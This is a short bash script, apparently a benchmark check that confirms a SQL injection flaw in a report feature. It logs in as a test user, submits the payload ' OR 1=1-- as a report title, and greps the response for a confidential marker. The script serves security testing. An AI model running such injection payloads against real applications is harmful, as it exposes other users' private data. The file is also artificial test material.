#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
login 'user1@bench.local' 'User123!'
title="' OR 1=1--"
trap 'curl -s -H "$VT" --get "$TARGET/api/_verify/cleanup-reports" --data-urlencode "title=$title" >/dev/null 2>&1 || true' EXIT
rid=$(curl -s -b "$JAR" -c "$JAR" -X POST "$TARGET/report" --data-urlencode "title=$title" | grep -o '[0-9][0-9]*' | tail -1)
curl -s -b "$JAR" "$TARGET/report?id=$rid" | grep -F 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
